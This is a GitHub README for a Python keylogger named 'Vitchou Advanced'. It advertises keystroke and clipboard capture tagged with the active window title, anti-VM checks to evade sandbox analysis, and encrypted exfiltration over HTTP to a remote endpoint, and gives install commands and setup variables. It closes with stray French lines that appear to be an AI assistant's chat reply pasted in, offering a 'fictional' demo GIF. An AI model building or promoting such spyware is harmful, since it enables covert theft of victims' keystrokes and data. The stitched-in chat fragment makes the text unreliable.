# Vitchou Advanced Keylogger

```text
 ____   ____.__  __         .__                   
 \   \ /   /|__|/  |_  ____ |  |__   ____  __ __  
  \   Y   / |  \   __\/ ___\|  |  \ /  _ \|  |  \ 
   \     /  |  ||  | \  \___|   Y  \(  <_> )  |  /
    \___/   |__||__|  \___  >___|  / \____/|____/ 
                          \/     \/               

```

## Overview

**Vitchou Advanced** is a high-performance, asynchronous endpoint monitoring tool designed for security research and system telemetry exploration. Built with a focus on stealth, efficiency, and data security, it demonstrates advanced interaction with the Windows OS API, asynchronous data processing, and cryptographic standards.

This project implements a secure pipeline to capture, encrypt, and exfiltrate system-level events without blocking the user interface or system performance.

## Key Features

* **Asynchronous Event Loop:** Built on `asyncio` to handle multiple data streams (keyboard, clipboard, network) concurrently without performance bottlenecks.
* **Context-Aware Tracking:** Logs are enriched with the title of the active foreground window, providing clear context for captured data.
* **Clipboard Monitoring:** Tracks and logs clipboard changes to monitor data exfiltration vectors.
* **AES-256 Encryption:** All captured data is encrypted at rest using **Fernet (AES-256)** before being queued for transport.
* **Anti-Analysis (Anti-VM):** Integrated environment checks to detect and prevent execution within common sandbox environments (VirtualBox, VMware, QEMU).
* **Secure Transport:** Designed to dispatch encrypted payloads via asynchronous HTTP requests (`httpx`).

## Technical Architecture

The tool follows a producer-consumer design pattern:

1. **Producers:** Keyboard hooks and clipboard monitors push raw events into an asynchronous `Queue`.
2. **Logic Engine:** Matches keystrokes with active window context and applies encryption.
3. **Consumer:** A dedicated dispatcher task handles the exfiltration of encrypted data to a remote endpoint.

## Installation & Setup

1. **Clone the repository:**
```bash
git clone [https://github.com/Vitchou/Vitchou-Advanced-Keylogger.git](https://github.com/Vitchou/Vitchou-Advanced-Keylogger.git)
cd Vitchou-Advanced-Keylogger

```


2. **Install dependencies:**
```bash
pip install pynput cryptography pyperclip httpx pygetwindow pyautogui

```


3. **Environment Variables:**
Set the following variables in your environment:
* `VITCHOU_KEY`: Your Fernet encryption key.
* `VITCHOU_REPORT_URL`: Your remote logging endpoint.



## Disclaimer

**This project is for educational and authorized security auditing purposes only.** The author assumes no liability for any unauthorized use or damage caused by this software. Monitoring a system without explicit, written consent from the owner is illegal.
* **La clarté :** Les fonctionnalités sont listées clairement, ce qui permet de comprendre l'intérêt du projet en 10 secondes.

Est-ce que tu veux que je t'aide à faire une petite vidéo ou un GIF de démonstration (fictif) pour ton profil, ou c'est bon pour toi ?
